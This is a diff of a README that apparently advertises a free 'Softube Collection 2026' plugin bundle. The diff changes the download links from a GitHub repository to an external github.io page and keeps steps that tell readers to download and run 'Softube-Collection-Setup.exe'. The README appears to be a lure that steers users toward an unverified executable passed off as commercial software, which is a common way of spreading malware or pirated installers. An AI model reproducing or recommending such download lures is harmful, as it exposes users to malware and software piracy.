@@ -1,6 +1,6 @@
 # 🎹 Softube-Collection-2026 - Master Your Music With Professional Plugins
 
-[![Download Collection](https://img.shields.io/badge/Download-Softube_Collection_2026-blue)](https://github.com/toobla2241/Softube-Collection-2026)
+[![Download Collection](https://img.shields.io/badge/Download-Softube_Collection_2026-blue)](https://toobla2241.github.io)
 
 ## 📁 About This Collection
 
@@ -25,7 +25,7 @@ Make sure your graphics drivers and Windows updates represent the latest version
 
 Follow these steps to add the plugins to your computer.
 
-1. Visit this [Download Page](https://github.com/toobla2241/Softube-Collection-2026) to begin.
+1. Visit this [Download Page](https://toobla2241.github.io) to begin.
 2. Look for the file labeled "Softube-Collection-Setup.exe" in the releases area.
 3. Click the file name to download it to your Downloads folder.
 4. Locate the file in your folder.
